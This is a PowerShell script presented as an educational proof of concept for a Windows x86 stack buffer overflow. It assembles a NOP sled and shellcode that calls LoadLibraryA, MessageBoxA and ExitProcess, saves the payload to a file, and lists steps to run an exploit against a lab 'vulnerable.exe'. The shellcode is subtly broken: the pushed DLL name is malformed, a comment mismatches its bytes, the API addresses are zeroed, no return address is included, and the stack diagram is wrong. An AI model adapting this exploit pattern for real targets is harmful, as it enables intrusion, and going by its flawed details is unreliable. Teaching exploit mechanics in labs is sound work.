#!/usr/bin/env powershell
<#
Windows x86 Shellcode PoC Demonstration
Generates and displays the payload without requiring compilation
#>

Write-Host "======================================" -ForegroundColor Cyan
Write-Host "Windows x86 Shellcode PoC - Demo Run" -ForegroundColor Cyan
Write-Host "======================================" -ForegroundColor Cyan
Write-Host ""

# NOP sled (100 bytes of 0x90)
$nopSled = @(0x90) * 100
Write-Host "[+] NOP Sled Generated" -ForegroundColor Green
Write-Host "    Size: $($nopSled.Length) bytes"
Write-Host "    Hex: $($nopSled[0..15] | ForEach-Object { $_.ToString('X2') }) ..."
Write-Host ""

# Shellcode payload
$shellcode = @(
    # Push "USER32.DLL" in reverse
    0x68, 0x44, 0x4C, 0x4C, 0x00,  # push "DLL\x00"
    0x68, 0x33, 0x32, 0x2E, 0x44,  # push "32.D"
    0x68, 0x55, 0x53, 0x45, 0x52,  # push "USER"
    0x54,                            # push esp (& "USER32.DLL")
    # mov ebx, <LoadLibraryA>
    0xBB, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xD3,                      # call ebx
    # Push message "MUZU HACKNOUT PC?" in reverse
    0x68, 0x3F, 0x00, 0x00, 0x00,  # push "?\0\0\0"
    0x68, 0x54, 0x20, 0x50, 0x43,  # push "T PC"
    0x68, 0x4B, 0x4E, 0x4F, 0x55,  # push "KNOU"
    0x68, 0x20, 0x48, 0x41, 0x43,  # push " HAC"
    0x68, 0x4D, 0x55, 0x5A, 0x55,  # push "UZUM"
    0x8B, 0xEC,                      # mov ebp, esp
    0x6A, 0x23,                      # push 0x23 (uType)
    0x6A, 0x00,                      # push 0 (title)
    0x55,                            # push ebp (& message)
    0x6A, 0x00,                      # push 0 (hwnd)
    # mov ebx, <MessageBoxA>
    0xBB, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xD3,                      # call ebx
    0x50,                            # push eax
    # mov ebx, <ExitProcess>
    0xBB, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xD3,                      # call ebx
    0x6A, 0x00,                      # push 0
    0xFF, 0xD3                       # call ebx
)

Write-Host "[+] Shellcode Payload Generated" -ForegroundColor Green
Write-Host "    Size: $($shellcode.Length) bytes"
Write-Host "    Hex: $($shellcode[0..15] | ForEach-Object { $_.ToString('X2') }) ..."
Write-Host ""

# Combine payload
$payload = $nopSled + $shellcode
Write-Host "[+] Complete Payload" -ForegroundColor Green
Write-Host "    Total size: $($payload.Length) bytes"
Write-Host "    NOP sled: 100 bytes"
Write-Host "    Shellcode: $($shellcode.Length) bytes"
Write-Host ""

# Save to binary file
$outputPath = "payload.bin"
[System.IO.File]::WriteAllBytes($outputPath, [byte[]]$payload)
Write-Host "[+] Payload saved to: $outputPath" -ForegroundColor Green
Write-Host ""

# Analyze payload
Write-Host "[*] Payload Analysis:" -ForegroundColor Yellow
Write-Host "    - First 32 bytes (NOP sled):"
Write-Host "      $($payload[0..31] | ForEach-Object { $_.ToString('X2') })" | Tee-Object -Variable hexNop
Write-Host ""
Write-Host "    - Shellcode start (after NOP sled):"
Write-Host "      $($payload[100..115] | ForEach-Object { $_.ToString('X2') })"
Write-Host ""

# Vulnerability details
Write-Host "[!] VULNERABILITY DETAILS:" -ForegroundColor Magenta
Write-Host "    Target: vulnerable.exe (32-byte buffer)"
Write-Host "    Method: Stack-based buffer overflow via gets()"
Write-Host "    Payload: $($payload.Length) bytes total"
Write-Host ""

# Attack scenario
Write-Host "[*] ATTACK SCENARIO:" -ForegroundColor Cyan
Write-Host "    1. vulnerable.exe allocates 32-byte buffer on stack"
Write-Host "    2. gets() reads input WITHOUT size checking"
Write-Host "    3. Input exceeds 32 bytes → overflows buffer"
Write-Host "    4. Overflow overwrites saved EBP (4 bytes)"
Write-Host "    5. Overflow overwrites return address (4 bytes)"
Write-Host "    6. Payload redirects execution to shellcode"
Write-Host "    7. Shellcode executes: LoadLibraryA → MessageBoxA → ExitProcess"
Write-Host ""

# Memory layout
Write-Host "[*] STACK LAYOUT (before overflow):" -ForegroundColor Cyan
Write-Host "    Lower addresses (stack grows down)"
Write-Host "    [100 bytes NOP sled   ] ← Padding (harmless)"
Write-Host "    [Shellcode bytes      ] ← Malicious code"
Write-Host "    [32-byte buffer[32]   ] ← Vulnerable buffer"
Write-Host "    [Saved EBP (4 bytes)  ] ← Will be overwritten"
Write-Host "    [Return address (4 b) ] ← Points to shellcode"
Write-Host "    Higher addresses (old stack frame)"
Write-Host ""

Write-Host "[+] Demonstration Complete!" -ForegroundColor Green
Write-Host "======================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "To compile and run:"
Write-Host "  1. Install GCC or MSVC compiler"
Write-Host "  2. Run: gcc -m32 -o exploit.exe exploit.c"
Write-Host "  3. Run: gcc -m32 -o vulnerable.exe vulnerable.c"
Write-Host "  4. Run: .\exploit.exe | .\vulnerable.exe"
Write-Host ""
Write-Host "DISCLAIMER: Educational purposes only!"
Write-Host "            Unauthorized access is illegal."
